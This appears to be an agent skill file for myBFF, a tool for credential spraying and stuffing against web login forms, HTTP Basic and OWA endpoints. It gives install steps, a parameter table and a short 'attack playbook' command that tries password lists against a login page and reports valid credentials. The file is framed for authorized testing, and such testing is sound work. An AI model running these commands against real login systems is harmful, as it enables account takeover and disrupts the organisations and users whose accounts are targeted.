---
name: mybff-login-brute
description: "myBFF: Batch web login form credential stuffing. Signals: brute force, password spraying, web form spraying, HTTP Basic, OWA."
zh-signals: "myBFF: Web 登录表单批量撞库。信号:暴力破解,口令喷射,Web 表单喷洒,HTTP Basic,OWA。"
when-to-use: >-
  Use when performing authorized credential spraying against web login forms, HTTP Basic
  or OWA endpoints and you already have username and password lists.
---

# myBFF

- Attack Category: C28 Cloud and Identity Spraying
- Upstream Repository: https://github.com/MooseDojo/myBFF
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/MooseDojo/myBFF && cd myBFF
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python myBFF.py -u users.txt -p pass.txt -t https://t.com/login -m form` | Web form spraying |
| `-m basic` | HTTP Basic |
| `-m owa` | OWA |
| `-t 5` | Threads |

## Attack Scenario Playbook

### Batch Credential Stuffing Against Web Login Forms

```bash
python myBFF.py -u emails.txt -p 'Pass1' -t https://vpn.t.com/login -m form
# outputs valid credentials on a hit
```

## Notes

Web authentication form spraying framework with automatic login field detection and error detection; supports Basic/OWA/Citrix templates.
